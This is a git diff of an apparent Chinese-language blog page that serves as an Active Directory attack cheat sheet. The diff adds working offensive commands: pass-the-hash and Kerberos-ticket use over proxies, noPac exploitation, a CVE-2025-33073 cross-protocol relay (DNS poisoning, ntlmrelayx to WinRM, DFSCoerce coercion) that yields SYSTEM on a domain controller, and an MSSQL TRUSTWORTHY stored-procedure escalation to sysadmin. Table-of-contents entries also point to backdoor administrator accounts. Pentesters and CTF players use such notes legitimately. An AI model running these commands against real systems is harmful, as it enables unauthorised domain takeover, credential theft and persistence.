@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
 <title>血缇之书</title>
 
-<link rel='canonical' href='http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
+<link rel='canonical' href='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 
 <link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="血缇之书">
-<meta property='og:description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
-<meta property='og:url' content='http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
+<meta property='og:description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
+<meta property='og:url' content='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 <meta property='og:site_name' content='wackymaker'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-10-31T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-10-31T19:40:56&#43;08:00'/>
 <meta name="twitter:title" content="血缇之书">
-<meta name="twitter:description" content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; 端口详细扫\rnmap -p 88,389,445,139,135 -sC -sV --min-rate=10000 -Pn dc01 域sid\rnxc\nnxc ldap $ip -u $user -p $pass -k --get-sid impacket\n如果ntlm禁用了，我们能通过kerbores认证通过getPac查询管理员的时候顺带查询域sid\nimpacket-getPac -targetUser administrator $domain/$user:$pass powershell本地\n">
+<meta name="twitter:description" content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
     </head>
     <body class="
     article-page
@@ -253,6 +253,7 @@
         <li><a href="#无约束委派">无约束委派</a></li>
         <li><a href="#约束委派">约束委派</a></li>
         <li><a href="#基于资源委派rbcd">基于资源委派(RBCD)</a></li>
+        <li><a href="#linux查询横向目标">linux查询横向目标</a></li>
         <li><a href="#域相关">域相关</a></li>
         <li><a href="#林相关">林相关</a></li>
         <li><a href="#adcs证书错误查询">ADCS证书错误查询</a></li>
@@ -388,6 +389,7 @@
     </li>
     <li><a href="#域历史漏洞或者中继cve">域历史漏洞或者中继（cve）</a>
       <ul>
+        <li><a href="#nopac漏洞">nopac漏洞</a></li>
         <li><a href="#cross-session-relay-跨会话中继">Cross Session Relay 跨会话中继</a></li>
         <li><a href="#krbrelay域用户提升域管理">krbRelay(域用户提升域管理)</a></li>
         <li><a href="#cve-2025-24071压缩包解压触发ntlm回调">CVE-2025-24071（压缩包解压触发ntlm回调）</a></li>
@@ -476,8 +478,19 @@
         <li><a href="#可用于提权组策略">可用于提权组策略</a></li>
       </ul>
     </li>
+    <li><a href="#linux相关-2">linux相关</a>
+      <ul>
+        <li><a href="#提权三件套">提权三件套</a></li>
+        <li><a href="#py交互shell">py交互shell</a></li>
+        <li><a href="#抓包">抓包</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
     <li><a href="#msf相关">msf相关</a>
       <ul>
+        <li><a href="#迅速部署msfubt">迅速部署msf（ubt）</a></li>
         <li><a href="#文件系统操作">文件系统操作</a></li>
         <li><a href="#系统信息收集">系统信息收集</a></li>
         <li><a href="#权限相关操作">权限相关操作</a></li>
@@ -493,13 +506,7 @@
         <li><a href="#载荷会话内使用">载荷会话内使用</a></li>
       </ul>
     </li>
-    <li><a href="#linux相关-2">linux相关</a>
-      <ul>
-        <li><a href="#提权三件套">提权三件套</a></li>
-        <li><a href="#py交互shell">py交互shell</a></li>
-        <li><a href="#抓包">抓包</a></li>
-      </ul>
-    </li>
+    <li><a href="#二开rustdesk使用">二开rustdesk使用</a></li>
   </ul>
 
   <ul>
@@ -514,6 +521,7 @@
       <ul>
         <li><a href="#后门机器账户创建">后门机器账户创建</a></li>
         <li><a href="#后门域管理创建需域管理权限">#后门域管理创建（需域管理权限）</a></li>
+        <li><a href="#后门本地管理创建需要本机管理员权限及以上">后门本地管理创建（需要本机管理员权限及以上）</a></li>
         <li><a href="#后门无预认证账户创建需域管理或者目标写入权限">后门无预认证账户创建（需域管理或者目标写入权限）</a></li>
       </ul>
     </li>
@@ -683,7 +691,7 @@
 
 
                 <time class="article-time--reading">
-                    50 minute read
+                    52 minute read
                 </time>
             </div>
         
@@ -710,14 +718,29 @@
 </span></span></code></pre></div><p>替换</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo mv krb5.conf /etc/krb5.conf
 </span></span></code></pre></div><h3 id="同步时间">同步时间
-</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo ntpdate dc
+</h3><h4 id="ntp方式">ntp方式
+</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo ntpdate dc
 </span></span><span style="display:flex;"><span>并停止自动更改
 </span></span><span style="display:flex;"><span>sudo service virtualbox-guest-utils stop
-</span></span></code></pre></div><p>或者在域机器执行</p>
+</span></span></code></pre></div><h4 id="手动方式">手动方式
+</h4><p>或者在域机器执行</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-Date
 </span></span></code></pre></div><p>本机修改</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo timedatectl set-ntp off
 </span></span><span style="display:flex;"><span>sudo date -s <span style="color:#e6db74">&#34;2025-06-12 04:02:28&#34;</span>
+</span></span></code></pre></div><h4 id="smb方式隧道环境尤为好用">smb方式（隧道环境尤为好用）
+</h4><p>密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>net time -S $ip -U <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">%</span>$pass<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 代理</span>
+</span></span><span style="display:flex;"><span>sudo proxychains4 net time set -S $ip -U <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">%</span>$pass<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>net time -S $ip -U <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">&#34;</span> -N --pw-nt-hash $hash
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 代理</span>
+</span></span><span style="display:flex;"><span>sudo proxychains4 net time -S $ip -U <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">&#34;</span> -N --pw-nt-hash $hash
+</span></span></code></pre></div><p>tgt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo proxychains4 net time -S $ip -U <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">&#34;</span> -N --use-kerberos<span style="color:#f92672">=</span>desired --use-krb5-ccache<span style="color:#f92672">=</span>$ccache
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#代理</span>
+</span></span><span style="display:flex;"><span>sudo proxychains4 net time -S $ip -U <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">&#34;</span> -N --use-kerberos<span style="color:#f92672">=</span>desired --use-krb5-ccache<span style="color:#f92672">=</span>$ccache
 </span></span></code></pre></div><h3 id="端口详细扫">端口详细扫
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nmap -p 88,389,445,139,135 -sC -sV --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span> -Pn dc01
 </span></span></code></pre></div><h3 id="域sid">域sid
@@ -971,6 +994,11 @@
 </span></span></code></pre></div><p>条件：对任意机器账户具有写入权限
 powerview</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#39;*GenericWrite*&#39;</span> }
+</span></span></code></pre></div><h3 id="linux查询横向目标">linux查询横向目标
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>cat /etc/hosts
+</span></span><span style="display:flex;"><span>ip a
+</span></span><span style="display:flex;"><span>ip route
+</span></span><span style="display:flex;"><span>cat /etc/resolv.conf
 </span></span></code></pre></div><h3 id="域相关">域相关
 </h3><h4 id="域信任">域信任
 </h4><p>nxc</p>
@@ -1086,6 +1114,8 @@ nxc</p>
 </span></span><span style="display:flex;"><span>   RPORT                <span style="color:#ae81ff">1433</span>                  yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>   USERNAME             SQLGuest              no        The username to authenticate as
 </span></span><span style="display:flex;"><span>   USE_WINDOWS_AUTHENT  false                 yes       Use windows authentication <span style="color:#f92672">(</span>requires DOMAIN option set<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>nxc高版本也可以</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc mssql $ip -u $user -p $pass  --local-auth --rid-brute
 </span></span></code></pre></div><h4 id="ldap查询">ldap查询
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap $ip -u $user -p $pass --users
 </span></span></code></pre></div><p>如果以上nxc普通域用户无法枚举则是权限不够，可以通过创建机器用户并用机器用户枚举成功，注意不排除存在匿名ldap权限</p>
@@ -1932,6 +1962,11 @@ nxc</p>
 </span></span><span style="display:flex;"><span>需要数据库oner为sa
 </span></span><span style="display:flex;"><span>需要TRUSTWORTHY 开启on参数（sa才能设置）
 </span></span></code></pre></div><p>提权思路，创建一个存储过程指定用数据库oner权限执行，从而以数据库权限劫持服务器权限</p>
+<p>查询是否有数据库开启TRUSTWORTHY</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SELECT name as database_name , SUSER_NAME<span style="color:#f92672">(</span>owner_sid<span style="color:#f92672">)</span> AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys.databases;
+</span></span></code></pre></div><p>查询是否有用户是这个数据库的db_oner</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SELECT DP1.name AS DatabaseRoleName, isnull<span style="color:#f92672">(</span>DP2.name, <span style="color:#e6db74">&#39;No members&#39;</span><span style="color:#f92672">)</span> AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DP1 ON DRM.role_principal_id <span style="color:#f92672">=</span> DP1.principal_id LEFT OUTER JOIN sys.database_principals AS DP2 ON DRM.member_principal_id <span style="color:#f92672">=</span> DP2.principal_id WHERE DP1.type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;R&#39;</span> ORDER BY DP1.name;
+</span></span></code></pre></div><p>如果条件成立，允许我们提升至sa用户</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e"># 以db_oner权限创建恶意储存</span>
 </span></span><span style="display:flex;"><span>CREATE PROCEDURE dbo.sp_elevate_privs WITH EXECUTE AS OWNER AS BEGIN EXEC sp_addsrvrolemember <span style="color:#e6db74">&#39;$user&#39;</span>, <span style="color:#e6db74">&#39;sysadmin&#39;</span>; END
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># 执行恶意储存</span>
@@ -1954,7 +1989,7 @@ nxc</p>
 </span></span><span style="display:flex;"><span>赋予
 </span></span><span style="display:flex;"><span>EXEC sp_addsrvrolemember <span style="color:#e6db74">&#39;$user&#39;</span>, <span style="color:#e6db74">&#39;sysadmin&#39;</span>;
 </span></span></code></pre></div><h4 id="作业与调度相关利用以下内容除了db_ddladmin滥用部分默认具备sa权限">作业与调度相关利用(以下内容除了db_ddladmin滥用部分默认具备sa权限)
-</h4><p>所有调度默认再msdb中查询更改以及使用，其利用mssql-agent服务账户自动运行作业而不是mssql-server服务账户，注意mssql-agent服务默认是不启用或者需要手动开启的，以下大部分内容仅仅在其以及开启使用的情况下有用.且以下命令全部以impacket-client执行为准。</p>
+</h4><p>所有调度默认在msdb中查询更改以及使用，其利用mssql-agent服务账户自动运行作业而不是mssql-server服务账户，注意mssql-agent服务默认是不启用或者需要手动开启的，以下大部分内容仅仅在其以及开启使用的情况下有用.且以下命令全部以impacket-mssqlclient执行为准。</p>
 <p>一句话概括作业就是任务，调度就是定时处理，而储存过程是数据库命令集合的脚本，一般是调度用来自动执行作业，而作业内置了cmd或者powershell等或者储存过程</p>
 <p>查询agent是否在运行</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>USE master; SELECT servicename, service_account, status, status_desc FROM sys.dm_server_services;
@@ -2323,9 +2358,21 @@ nxc</p>
 <p>虽然连接进去就算反弹shell也是服务账户的权限，但是可以以其组权限进行文件读取</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SELECT BulkColumn FROM OPENROWSET <span style="color:#f92672">(</span>BULK <span style="color:#e6db74">&#39;C:\Users\Administrator\Desktop\root.txt&#39;</span>, SINGLE_CLOB<span style="color:#f92672">)</span> AS MyFile;
 </span></span></code></pre></div><h2 id="域历史漏洞或者中继cve">域历史漏洞或者中继（cve）
-</h2><h3 id="cross-session-relay-跨会话中继">Cross Session Relay 跨会话中继
+</h2><h3 id="nopac漏洞">nopac漏洞
+</h3><h4 id="要求">要求
+</h4><p>必须同时存在以下两个漏洞：</p>
+<p>CVE‑2021‑42278</p>
+<p>DC 对 不存在的计算机账户名 处理不严</p>
+<p>CVE‑2021‑42287</p>
+<p>TGS 校验 sAMAccountName 与 SID 不一致</p>
+<p>检测命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb  $ip -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span> -M nopac
+</span></span></code></pre></div><h4 id="攻击命令">攻击命令
+</h4><p>使用工具</p>
+<pre tabindex="0"><code>https://github.com/Ridter/noPac
+</code></pre><h3 id="cross-session-relay-跨会话中继">Cross Session Relay 跨会话中继
 </h3><p>当存在其他用户登陆会话后，可以尝试打跨会话中继获得登陆会话的用户hash</p>
-<h4 id="要求">要求
+<h4 id="要求-1">要求
 </h4><p>无要求，需要确认存在用户登陆会话，最好还要确定目标防火墙规则</p>
 <h4 id="remotepotato0exe">RemotePotato0.exe
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/antonioCoco/RemotePotato0/releases
@@ -2340,7 +2387,7 @@ nxc</p>
 </span></span><span style="display:flex;"><span>-p 监听端口
 </span></span></code></pre></div><p>如果防火墙不允许，请不要使用9999</p>
 <h3 id="krbrelay域用户提升域管理">krbRelay(域用户提升域管理)
-</h3><h4 id="要求-1">要求
+</h3><h4 id="要求-2">要求
 </h4><p>1，具备域用户
 2，没有 2022 年 10 月的补丁
 3，必须禁用 LDAP 签名（这是 Windows 的默认设置）。
@@ -2384,10 +2431,22 @@ nxc</p>
 </h4><p>exp</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/mverschu/CVE-2025-33073
 </span></span></code></pre></div><p>一句命令攻击</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 CVE-2025-33073.py -u $domain<span style="color:#ae81ff">\$</span>user -p $pass --attacker-ip $kali_ip --dns-ip $kali_ip --dc-fqdn $DC_FQDN --target $TARGET_FQDN --target-ip $TARGET_IP
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 CVE-2025-33073.py -u $domain<span style="color:#ae81ff">\$</span>user -p $pass --attacker-ip $kali_ip --dns-ip $dns_ip --dc-fqdn $DC_FQDN --target $TARGET_FQDN --target-ip $TARGET_IP
 </span></span></code></pre></div><p>成功的话会获取target的机器用户hash，并且获取此机器所有本地用户hash（sam）</p>
 <h4 id="实操小提示">实操小提示
 </h4><p>如果发现ca存在esc8，并且33073可用，则可进行组合利用，具体操作搜索本笔记esc8</p>
+<h4 id="跨协议中继衍生用法允许直接攻击dc">跨协议中继（衍生用法允许直接攻击dc）
+</h4><p>当发现目标环境没有25年1月左右的更新，或者说存在33073漏洞时，我们可以利用跨协议中继直接攻击dc</p>
+<p>因为smb协议存在签名认证，但其他的不存在，所以我们那dc的winrm来举例</p>
+<p>首先对dc添加33073特有的dns解析为kali</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 dnstool.py -u <span style="color:#e6db74">&#39;$domain\$user&#39;</span> -p <span style="color:#e6db74">&#39;$pass&#39;</span> $ip --action add -r $hostname1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d $kali_ip
+</span></span></code></pre></div><p>利用ntlmrelay中继目标为dc的winrm（或者winrms）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-ntlmrelayx -debug -smb2support --target winrm://$ip
+</span></span></code></pre></div><p>另一边用nxc查找允许coerce</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb $ip -u $user -p $pass -M coerce_plus
+</span></span></code></pre></div><p>触发中继</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb $ip -u $user -p $pass -M coerce_plus -o <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$hostname1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA&#39;</span> METHOD<span style="color:#f92672">=</span>DFSCoerce
+</span></span></code></pre></div><p>触发成功后会在ntlmrelay处看到中继成功，使用nc连接本地的11000端口获得dc的system权限</p>
 <h3 id="cve-2020-1472-zerologon零登陆强行使计算机用户密码为零字节并且打dcsync">CVE-2020-1472 （ZeroLogon零登陆，强行使计算机用户密码为零字节，并且打dcsync）
 </h3><p>请注意，默认情况下，这会更改域控制器帐户的密码。是的，这允许您使用 DCSync，但它也会中断与其他域控制器的通信，因此请小心！</p>
 <h4 id="条件-2">条件
@@ -2652,7 +2711,11 @@ nxc</p>
 </span></span><span style="display:flex;"><span>sc.exe \\$hostname start dns
 </span></span></code></pre></div><p>如果不具备服务重启权限的话，可以利用工具直接重启</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>dnscmd.exe <span style="color:#ae81ff">127.0</span>.0.1 /restart
-</span></span></code></pre></div><h3 id="ad-recycle-ad回收">AD Recycle （ad回收）
+</span></span></code></pre></div><h4 id="注意">注意
+</h4><p>2021年更新后的ad无法使用，微软对这一功能进行了加固：</p>
+<p>ServerLevelPluginDll 参数已被移到受保护的注册表位置（HKLM\SYSTEM\CurrentControlSet\Services\DNS\InternalParameters）。
+只有完全管理员（如 Domain Admins 或 DNS 服务器本地的 Administrators）才能修改它。</p>
+<h3 id="ad-recycle-ad回收">AD Recycle （ad回收）
 </h3><p>先查询是否存在已回收高敏感权限</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ADObject -filter <span style="color:#e6db74">&#39;isDeleted -eq $true -and name -ne &#34;Deleted Objects&#34;&#39;</span> -includeDeletedObjects
 </span></span></code></pre></div><p>之后获取已经回收的用户所有信息</p>
@@ -2694,7 +2757,7 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Add-DomainGroupMember -Identity <span style="color:#e6db74">&#39;$group&#39;</span> -Members <span style="color:#e6db74">&#39;$user&#39;</span>
 </span></span></code></pre></div><p>远程添加</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodyAD --host <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -d <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$pass<span style="color:#e6db74">&#34;</span> add groupMember <span style="color:#e6db74">&#34;DEVELOPERS&#34;</span> <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span>
-</span></span></code></pre></div><p>如果没有权限添加入管理员组，则可以尝试添加入laps读取组或者其他高危组进行下一步操作</p>
+</span></span></code></pre></div><p>如果没有权限添加入管理员组，则可以直接打rbcd，此组用户默认对域控以外的域内计算机也是全部权限</p>
 <h3 id="laps_readerslaps读取者">LAPS_Readers（laps读取者）
 </h3><p>很易于理解。能读取laps
 本地请求</p>
@@ -3162,8 +3225,8 @@ targetedKerberoast.py</p>
